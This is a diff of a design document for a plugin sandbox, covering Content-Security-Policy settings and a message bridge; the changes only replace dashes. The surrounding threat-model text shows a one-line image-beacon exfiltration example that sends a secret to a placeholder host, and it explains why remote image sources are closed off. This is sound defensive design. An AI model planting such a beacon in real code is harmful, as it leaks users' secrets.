@@ -35,11 +35,11 @@ review produces false negatives (Figma's own conclusion after a sandbox-escape b
   `connect-src 'none'` blocks fetch/XHR/WebSocket, but it is **not** "cannot
   exfiltrate" on its own: **any allowed remote `img-src` is a beacon channel**
   (`new Image().src = 'https://host/?d=' + secret`). So `img-src` is `'self'` +
-  `data:` only — platform media is handed to the plugin **over the bridge**, never as
+  `data:` only - platform media is handed to the plugin **over the bridge**, never as
   a fetchable URL the plugin builds. A reviewed/featured plugin that genuinely needs
   an asset host may be granted a narrow `allowedConnectSrc`/`img-src` (default empty).
   Also note: the plugin **bundle** must be re-hosted **same-origin** on the plugin
-  origin so `script-src 'self'` actually covers it — `script-src` is never widened to
+  origin so `script-src 'self'` actually covers it - `script-src` is never widened to
   a CDN (a CDN script URL would re-open the exfil/mining surface).
 
 ## The bridge (a tiny, validated MessageChannel protocol)
@@ -153,7 +153,7 @@ contained, zero core bloat) and graduate to real packages when Phase 1 lands.
   transport cores, unit-tested, hardened: source-pinned handshake, flood/size/phase
   enforcement, protocol versioning). The `examples/external-plugin/` harness is synced
   to the hardened bridge and now **actually runs** end-to-end (`npx vite` →
-  `/dev-host.html`) — it had two latent blockers (zod not resolvable from the folder,
+  `/dev-host.html`) - it had two latent blockers (zod not resolvable from the folder,
   and the null-origin frame couldn't load modules without CORS), both fixed.
 - ⏳ Phase 0–1 remaining: serve the real host shell from the origin (`file_server`,
   swapping today's placeholder `respond`) + `@doot-games/plugin-dev` + `create-doot-game`.
